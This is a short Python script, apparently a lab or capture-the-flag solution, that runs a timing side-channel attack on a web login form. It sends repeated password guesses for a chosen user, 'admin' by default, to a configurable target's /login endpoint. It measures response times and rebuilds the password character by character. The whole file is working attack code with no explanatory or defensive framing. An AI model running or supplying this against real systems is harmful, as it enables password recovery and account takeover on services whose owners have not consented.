#!/usr/bin/env python3
import os, time, string, requests

BASE = os.getenv('TARGET', 'http://127.0.0.1:5000')
USER = os.getenv('USER', 'admin')
CHARS = string.ascii_letters + string.digits + '_-!@#$%^&*()'
MAXLEN = int(os.getenv('MAXLEN', '24'))
TRIALS = int(os.getenv('TRIALS', '3'))

s = requests.Session()

def measure(pw):
    t = 0.0
    for _ in range(TRIALS):
        t0 = time.perf_counter()
        s.post(f"{BASE}/login", data={'username': USER, 'password': pw}, timeout=10)
        t += time.perf_counter() - t0
    return t / TRIALS

prefix = ''
for _ in range(MAXLEN):
    best = max(CHARS, key=lambda c: measure(prefix + c + 'A' * (MAXLEN - len(prefix) - 1)))
    prefix += best
    print('[+] guess:', prefix)
print('[*] candidate password prefix:', prefix)
